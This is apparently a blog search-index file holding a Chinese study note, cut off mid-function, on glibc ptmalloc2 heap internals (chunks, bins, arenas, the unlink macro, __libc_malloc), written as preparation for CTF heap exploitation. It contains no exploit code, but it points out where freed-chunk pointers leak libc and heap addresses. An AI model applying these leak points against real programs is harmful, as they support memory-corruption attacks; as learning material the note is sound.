<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Ptmalloc2 相关内容介绍</title>
    <link href="/2025/09/21/Ptmalloc2/"/>
    <url>/2025/09/21/Ptmalloc2/</url>
    
    <content type="html"><![CDATA[<p>实习的两个月，断断续续和栈相关的<code>pwn</code>题进行鏖战。对栈相关的基本内容已经了解的差不多了，碰到简单的题也能做一做（bushi    在buu第二页首次做到有关<code>heap</code>的pwn题。从以前的师傅那里了解到，<code>heap</code>是pwn里面一个比较大的模块了。在这里记一个笔记，希望能够像好多前辈一样对这块的内容不断总结不断学习，并且这个笔记也越来越完善，架构越来越饱满，万一以后写个<code>blog</code>能挂上去，对那些对二进制安全和<code>pwn</code>方向感兴趣的伙伴们有帮助（你在想什么混蛋，怎么会有人看你的blog啊！ 2025.8.28</p><h1 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h1><p>这里一定要区分进程所在内存的堆和数据结构中的堆是完全不同的两个概念。在程序运行过程中，堆是进程动态分配得到的内存段，是一段线性内存空间，地址从低地址向高地址生长。将为进程动态分配内存的代码段称为<strong>堆管理器</strong>。在Linux系统下包括传统的<code>heap</code>段和<code>Memory Mapping Segment</code>。如下图所示，还是很清楚的。堆与栈隔<code>Memory Mapping Segment</code>相望，实在是别有一番风味（乐</p><p><img src="/images/Ptmalloc2_str.png" alt="内存结构图"></p><p>堆管理器处于用户程序与内核中间，主要做以下工作</p><ol><li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li><li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li></ol><p>Linux早期使用Doug Lea作为堆管理器实现堆分配和回收。但是它在面临多线程的时候，不同进程之间会共享进程的堆内存空间。为了保证堆内存的安全性，在每一个进程访问堆内存的时候会上锁，虽然安全性得以保证，但是也导致了程序的效率低下。同时，如果在多线程使用时，没能正确控制，也可能影响内存分配和回收的正确性。为了解决这个问题，Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是 <strong><code>ptmalloc</code></strong> 。在 glibc-2.3.x. 之后，<code>glibc</code> 中集成了 <code>ptmalloc2</code>。</p><p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc&#x2F;free 函数来分配和释放内存块。</p><p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p><p>常见的虚拟内存地址空间布局如下：</p><p>0x00000000 - 0x08048000 （约128MB）：保留区域</p><ul><li>这部分地址空间通常包含了一些系统保留的区域，比如 C 运行库的内容等，用户程序不能直接访问，否则会导致段错误（segmentation fault）。</li></ul><p>0x08048000 - 0xC0000000：用户空间</p><ul><li>用户空间包含了进程的代码、数据以及堆和栈等，其中：<ul><li>.text 段通常从 0x08048000 开始，存放程序的可执行指令。</li><li>堆向高地址扩展，用于动态分配内存。</li><li>栈向低地址增长，用于存放函数调用的参数、局部变量等。</li></ul></li></ul><p>0xC0000000 - 0xFFFFFFFF：内核空间</p><ul><li>这段地址空间是内核的逻辑地址，用户空间的程序不能直接访问，需要通过系统调用等方式切换到内核态才能访问这部分内核虚拟地址空间。</li></ul><p>在这种布局下，每个进程都有自己独立的虚拟地址空间，其中用户空间和内核空间各自独立，保证了进程之间的隔离和安全性。</p><h2 id="ASLR-机制"><a href="#ASLR-机制" class="headerlink" title="ASLR 机制"></a>ASLR 机制</h2><p>Linux 中的 ASLR（Address Space Layout Randomization）机制通过对栈、内存映射段、堆的起始地址加上随机偏移量来打乱虚拟地址空间布局，从而增加攻击者猜测系统资源地址的难度，提高了系统的安全性。</p><p>ASLR 机制会对以下三个部分进行随机化：</p><ul><li>Random stack offset：Linux 会在进程启动时将栈顶地址随机化，从而防止攻击者通过栈溢出攻击获取程序控制权。</li><li>Random mmap offset：Linux 会对每个内存映射段的起始地址进行随机化，从而防止攻击者获取内存映射段的地址，进而执行代码注入等攻击。</li><li>Random brk offset：Linux 会对堆的起始地址进行随机化，从而防止攻击者通过堆溢出攻击获取程序控制权。</li></ul><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><p>堆的漏洞利用与这些结构密切相关。</p><h1 id="堆的一些主要内部结构"><a href="#堆的一些主要内部结构" class="headerlink" title="堆的一些主要内部结构"></a>堆的一些主要内部结构</h1><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>程序执行过程中，由malloc申请得到的内存叫做chunk，在<code>ptmalloc</code>内部用<code>malloc_chunk</code>结构体表示。当申请的<code>chunk</code>被free后，会被加入到相应的空闲管理列表中。具体结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><ul><li><code>prev_size</code>，前一个<code>chunk</code>的大小。如果前一个<code>chunk</code>是空闲的话，该字段记录的是前一个<code>chunk</code>的大小（包括<code>chunk</code>头）。否则，该字段可以用来存储物理相邻的前一个<code>chunk</code>的数据。</li><li><code>size</code> ，该 <code>chunk</code> 的大小，大小必须是 <code>MALLOC_ALIGNMENT</code> 的整数倍。如果申请的内存大小不是 <code>MALLOC_ALIGNMENT</code> 的整数倍，会被转换满足大小的最小的 <code>MALLOC_ALIGNMENT</code> 的倍数，这通过 <code>request2size()</code> 宏完成。32 位系统中， <code>MALLOC_ALIGNMENT</code> 可能是 <code>4</code> 或 <code>8</code> ；64 位系统中，<code>MALLOC_ALIGNMENT</code> 是 <code>8</code>。 该字段的低三个比特位对 <code>chunk</code> 的大小没有影响，它们从高到低分别表示<ul><li><code>NON_MAIN_ARENA</code>，记录当前 <code>chunk</code> 是否不属于主线程，1 表示不属于，0 表示属于。</li><li><code>IS_MAPPED</code>，记录当前 <code>chunk</code> 是否是由 mmap 分配的。</li><li><code>PREV_INUSE</code>，记录前一个 <code>chunk</code> 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 <code>chunk</code> 的 size 的 P 位为 0 时，我们能通过 <code>prev_size</code> 字段来获取上一个 <code>chunk</code> 的大小以及地址。这也方便进行空闲 <code>chunk</code> 之间的合并。</li></ul></li><li><code>fd</code>, <code>bk</code>。<code>chunk</code> 处于分配状态时，从 fd 字段开始是用户的数据。 <code>chunk</code> 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下：下一个&#x2F;上一个（非物理相邻）的空闲的<code>chunk</code>。</li><li><code>fd_nextsize</code>，<code>bk_nextsize</code>。<code>chunk</code>空闲的时候才使用，用于较大的<code>chunk</code>。<ul><li>fd_nextsize指向前一个与当前<code>chunk</code>大小不同的第一个空闲块，不包含bin的头指针。</li><li>bk_nextsize指向后一个与当前<code>chunk</code>大小不同的第一个空闲块，不包含bin的头指针。</li></ul></li></ul><p>关键点：</p><ol><li><p>当一个 <code>chunk</code> 正在被使用时，与它物理相邻的下一个chunk（高地址）块的 <code>prev_size</code> 字段无效，可以被当前chunk所使用，这就是 <code>chunk</code> 中的空间复用。</p></li><li><p>被释放的 <code>chunk</code> 被记录在链表中结构可以理解为：</p><p> prev_size</p><p> size</p><p> forword pointer to next chunk in free list</p><p> back pointer to previous chunk in free list</p><p> Unused space(maybe 0 bytes long)</p></li><li><p>如果一个chunk处于 <code>free</code> 状态，会有两个地方记录他的大小：</p><ol><li>当前chunk的size字段。</li><li>下一个chunk的prev_size字段。</li></ol></li></ol><p>用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>用户释放掉的chunk并不会马上归还给系统，<code>ptmalloc</code>会统一管理<code>heap</code>和<code>mmap</code>映射区域的空闲chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p><p>ptmalloc采用分箱式的方法对空闲的<code>chunk</code>进行管理。分为四类：fastbin，smallbin，unsorted bin， large bin。</p><p><code>bins</code> 主要用于索引不同 bin 的 fd 和 bk。</p><p>为了简化在双链接列表中的使用，每个<code>bin</code>的<code>header</code>都设置为<code>malloc_chunk</code>类型。这样可以避免<code>header</code>类型及其特殊处理。但是，为了节省空间和提高局部性，只分配<code>bin</code>的<code>fd/bk</code>指针，然后使用<code>repositioning tricks</code>将这些指针视为一个<code>malloc_chunk*</code>的字段。</p><p>数组中的 bin 依次如下</p><ol><li>第一个为 unsorted bin，字如其面，这里面的 <code>chunk</code> 没有进行排序，存储的 <code>chunk</code> 比较杂。</li><li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 <code>chunk</code> 的大小相同。两个相邻索引的 small bin 链表中的 <code>chunk</code> 大小相差的字节数为 <strong>2 个机器字长</strong>，即 32 位相差 8 字节，64 位相差 16 字节。</li><li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li></ol><p>此外，上述这些 bin 的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲 chunk 不能在一起</strong>。</p><p>所以，bin 的存储本质是**：**</p><ol><li><strong>管理结构（链表头）</strong>：在 <code>malloc_state</code>（也称为 arena header）结构体中，有一个专门的数组（如 <code>bins[128]</code>），这个数组的每个元素就是一个链表的头指针。</li><li><strong>链表节点（Chunks）</strong>：真正的空闲 chunk 散落在堆（heap）的各个位置。它们通过内部的 <code>fd</code> 和 <code>bk</code> 指针在逻辑上被串联起来，形成了 bin 链表。</li></ol><p>并不是所有的<code>chunk</code>被释放后就立即被放到bin中。ptmalloc为了提高分配的速度，会把一些小的<code>chunk</code>先放到<code>fast bins</code>的容器内。而且，fastbin容器中的<code>chunk</code>的使用标记总是被置位的，所以不满足上面的原则。</p><h3 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h3><p>需要注意的是，并不是所有的 <code>chunk</code> 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 <code>chunk</code> 先放到 fast bins 的容器内。而且，fastbin 容器中的 <code>chunk</code> 的使用标记总是被置位的，所以不满足上面的原则。</p><p>为了更加高效地利用 fast bin，glibc 采用单向链表对其中的每个 bin 进行组织，并且<strong>每个 bin 采取 LIFO 策略</strong>，最近释放的 <code>chunk</code> 会更早地被分配，所以会更加适合于局部性。也就是说，当用户需要的 <code>chunk</code> 的大小小于 fastbin 的最大大小时， ptmalloc 会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，ptmalloc 才会做接下来的一系列操作。</p><p>需要特别注意的是，fastbin 范围的 <code>chunk</code> 的 inuse 始终被置为 1。因此它们不会和其它被释放的 <code>chunk</code> 合并。</p><p>malloc_consolidate 函数可以将 fastbin 中所有能和其它 <code>chunk</code> 合并的 <code>chunk</code> 合并在一起。具体地参见后续的详细函数的分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */</span><br><br></code></pre></td></tr></table></figure><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>small bins中每个<code>chunk</code>的大小与其所在的<code>bin</code>的<code>index</code>关系为：<code>chunk_size = 2 * SIZE_SZ * index</code><br>2～63，总共有62个循环双向链表。每个链表中存储的<code>chunk</code>大小都一致。<code>small bins</code>中每个<code>bin</code>对应的链表采用<code>FIFO</code>的规则，所以同一个链表中先被释放的<code>chunk</code>会被先分配出去。</p><h3 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h3><p>large bins 中一共包括63个bin。每个bin中的<code>chunk</code>的大小不一致，而是处于一定区间范围内。</p><h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h3><p>unsorted bin 可以视为空闲<code>chunk</code>回归其所属<code>bin</code>之前的缓冲区。只有一个链表，其中的<code>chunk</code>处于乱序状态，主要有两个来源：</p><ul><li>一个较大的<code>chunk</code>被分割成两半后，如果剩下的部分大于<code>MINSIZE</code>，就会被放到<code>unsorted bin</code>中</li><li>释放一个不属于<code>fast bin</code>的<code>chunk</code>，如果不与<code>top chunk</code>相邻，就会被放到<code>unsorted bin</code>中。</li></ul><p>采用的遍历顺序是：FIFO</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>程序第一次进行 <code>malloc</code> 的时候，heap会被分成两块，一块给用户，剩下的那块就是top chunk，可以看作当前堆物理地址最高的top。该 chunk 不属于任何一个bin，当所有的bin都无法满足用户申请的大小时，就从 top chunk取，然后将剩下的部分作为新的 <code>top chunk</code> 。</p><h2 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h2><p><code>arena</code> 是 <code>glibc</code> 用来管理堆内存的独立、并行的数据结构。当程序调用 <code>malloc</code> 申请内存时， <code>glibc</code> 不会直接向操作系统请求小块内存，而是从一个或者多个 <code>Arena</code> 中分配。</p><p>分配器状态（malloc_state）的实例，负责一组 heap&#x2F;segment 的管理（bins、top chunk、fastbins、mutex、统计等）。多线程下多个 arena 并行减少锁竞争。</p><p>这里需要理清楚 <code>arena</code> <code>bin</code> <code>chunk</code> 之间的关系：</p><p>它们的关系：<strong>arena 包含若干 bin 和管理元数据；bin 链表里连着 chunk；chunk 属于创建它的 arena（来自该 arena 管理的 heap&#x2F;segment）</strong>。</p><h2 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h2><p>程序刚开始执行的时候，每个线程是没有heap区域的，当申请内存时，用该结构来记录堆的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span><br>  <span class="hljs-type">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><h2 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h2><p>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态。一个 <code>arena</code> 对应一个 <code>malloc_state</code> 。</p><p>比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。由于 thread 的 arena 可能有多个，malloc state 结构会在最新申请的 arena 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  <span class="hljs-type">mutex_t</span> mutex;<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里面的 <code>bins</code> 结构是 <code>mchunkptr</code> ，对应的是一个 <code>malloc_chunk</code> </p><p><strong>注意，main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段。</strong></p><h2 id="深入理解堆的实现"><a href="#深入理解堆的实现" class="headerlink" title="深入理解堆的实现"></a>深入理解堆的实现</h2><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>用来讲一个双向链表（只存储空闲的 <code>chunk</code> )中的一个元素取出来用于</p><ul><li>malloc<ul><li>从恰好大小合适的 <code>large bin</code> 中获取 <code>chunk</code><ul><li>fastbin 与 smallbin 没有使用unlink，漏洞经常出现在这里。</li><li>依次遍历处理 <code>unsorted bin</code> 时也没有使用 <code>unlink</code> 。</li></ul></li><li>从 比请求的chunk所在的bin大的bin中取chunk</li></ul></li><li>free<ul><li>后向合并，合并物理相邻低地址空闲chunk</li><li>前向合并，合并物理相邻高地址空闲chunk（除了top chunk）</li></ul></li><li>malloc_consolidate<ul><li>后向合并，合并物理相邻低地址空闲chunk</li><li>前向合并，合并物理相邻高地址空闲chunk（除了top chunk）</li></ul></li><li>realloc<ul><li>前向扩展，合并物理响铃高地址空闲chunk（除了top chunk）</li></ul></li></ul><p>unlink的源码在 <code>glibc</code> 中是以宏定义的形式实现的，从 <code>bin</code> 列表中取出一个 <code>chunk</code> ，实际上就是一个双向链表操作。代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="hljs-meta">      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span><br><span class="hljs-meta">    FD = P-&gt;fd;      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="hljs-meta">      malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;      \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;      \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="hljs-meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">      malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="hljs-meta">                  &#125;      \</span><br><span class="hljs-meta">              &#125; <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">              &#125;      \</span><br><span class="hljs-meta">          &#125;      \</span><br><span class="hljs-meta">      &#125;      \</span><br><span class="hljs-meta">&#125;</span><br></code></pre></td></tr></table></figure><p>不过要注意几点：</p><ol><li>定义中会先检查FD，BK是否合法，防止攻击者简单篡改 <code>chunk</code> 的fd的bk指针。</li><li>会检查该 <code>chunk</code> 块的 <code>size</code> 和他的下一块 <code>chunk</code> 中的 <code>prev_size</code> 是否相同。（实际上是定义检查。</li></ol><p>可以从源码看出， <code>chunk</code> 块 <code>P</code> 本的 <code>fd</code> 指针和 <code>bk</code> 指针并没有发生改变，这个地方</p><ul><li>libc 地址<ul><li>P 位于双向链表头部，bk 泄漏</li><li>P 位于双向链表尾部，fd 泄漏</li><li>双向链表只包含一个空闲 chunk 时，P 位于双向链表中，fd 和 bk 均可以泄漏</li></ul></li><li>泄漏堆地址，双向链表包含多个空闲 chunk<ul><li>P 位于双向链表头部，fd 泄漏</li><li>P 位于双向链表中，fd 和 bk 均可以泄漏</li><li>P 位于双向链表尾部，bk 泄漏</li></ul></li></ul><p>这里的头部说的是 bin 的 fd指向的chunk，即最新加入的chunk。尾部说的是bin的 bk 指向的chunk，即最早加入的chunk。</p><h2 id="堆初始化"><a href="#堆初始化" class="headerlink" title="堆初始化"></a>堆初始化</h2><p>堆初始化是在用户第一次申请内存时执行 malloc_consolidate 再执行 malloc_init_state 实现的。这里不做过多讲解。可以参见 <code>malloc_state</code> 相关函数。</p><h2 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h2><h3 id="lib-malloc函数"><a href="#lib-malloc函数" class="headerlink" title="__lib_malloc函数"></a>__lib_malloc函数</h3><p>我们写 <code>C</code> 语言的时候，使用 <code>malloc</code> 来让系统分配内存。 <code>glibc</code> 中通过 <code>__lib_malloc</code> 实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><br>  arena_get (ar_ptr, bytes);<br><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      